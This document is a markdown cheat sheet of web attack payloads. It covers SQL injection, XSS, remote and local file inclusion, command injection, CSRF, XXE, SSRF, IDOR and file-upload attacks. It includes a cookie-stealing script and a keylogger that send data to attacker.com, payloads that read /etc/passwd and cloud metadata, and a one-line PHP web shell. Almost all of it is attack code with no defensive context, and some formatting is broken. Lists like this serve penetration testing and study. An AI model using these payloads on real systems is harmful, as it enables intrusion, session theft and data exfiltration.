### 1. SQL Injection (SQLi)

**Basic SQL Injection Payloads:**
- Auth Bypass
```
	' OR '1'='1'	
```
- Union-based SQLi:
```
	' UNION SELECT null, username, password FROM users --
```
- Error Based SQLi:
```
- ' AND 1=CONVERT(int, (SELECT @@version)) --
```
- Boolean Based Blind SQLi:
	
	``` AND (SELECT SUBSTRING(@@version, 1, 1)) = '5' --```


**Advanced SQL Injection Payloads:**

- **Extracting Data:**
```
    ' UNION SELECT 1, username, password FROM users --
    ```
    
	 
	 
	 
	 **Time-based Blind SQLi:**
    
    
    

- ```
    ' OR IF(1=1, SLEEP(5), 0) --
    ```
    

### 2. Cross-Site Scripting (XSS)

**Reflected XSS Payloads:**

- **Basic Alert:**
    
    javascript
    

- ```
    <script>alert('XSS')</script>
    ```
    
- **Cookie Stealer:**
    
    javascript
    

- ```
    <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
    ```
    

**Stored XSS Payloads:**

- **Persistent Alert:**
    
    javascript
    

- ```
    <img src=x onerror="alert('XSS')">
    ```
    
- **Keylogger:**
    
    javascript
    

- ```
    <script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log?key=' + e.key);
    }
    </script>
    ```
    

### 3. Remote File Inclusion (RFI)

**Basic RFI Payloads:**

- **Include a Remote File:**
    
    php
    

- ```
    http://target.com/vuln.php?page=http://attacker.com/malicious.txt
    ```
    

**PHP Code Execution via RFI:**

- **Execute PHP Code:**
    
    php
    

- ```
    http://target.com/vuln.php?page=http://attacker.com/malicious.php
    ```
    

### 4. Local File Inclusion (LFI)

**Basic LFI Payloads:**

- **Access `/etc/passwd`:**
    
    php
    

- ```
    page=../../../../etc/passwd
    ```
    
- **Null Byte Injection (to bypass extensions):**
    
    php
    

- ```
    page=../../../../etc/passwd%00
    ```
    

### 5. Command Injection

**Basic Command Injection Payloads:**

- **Execute Command:**
    
    bash
    

- ```
    ; ls -la
    ```
    
- **Chaining Commands:**
    
    bash
    

- ```
    | whoami
    ```
    

### 6. Cross-Site Request Forgery (CSRF)

**Basic CSRF Payloads:**

- **Form Submission:**
    
    html
    

- ```
    <form action="http://target.com/vulnerable_action" method="POST">
        <input type="hidden" name="param" value="malicious_value">
        <input type="submit" value="Submit">
    </form>
    ```
    

### 7. XML External Entity (XXE)

**Basic XXE Payloads:**

- **Extracting Files:**
    
    xml
    

- ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
    ]>
    <data>&xxe;</data>
    ```
    

### 8. Server-Side Request Forgery (SSRF)

**Basic SSRF Payloads:**

- **Access Internal Services:**
    
    http
    

- ```
    http://target.com/vulnerable_endpoint?url=http://169.254.169.254/latest/meta-data/
    ```
    

### 9. Insecure Direct Object Reference (IDOR)

**Basic IDOR Payloads:**

- **Accessing User Data:**
    
    http
    

- ```
    http://target.com/user?id=1234
    ```
    

### 10. File Upload Vulnerabilities

**Basic Payloads for File Upload:**

- **Malicious PHP File:**
    
    php
    

- ```
    <?php system($_GET['cmd']); ?>
    ```
    
- **Upload as Image:**
    
    php
    

```
<img src="data:image/png;base64,<?php echo base64_encode('<?php system($_GET["cmd"]); ?>'); ?>" />
```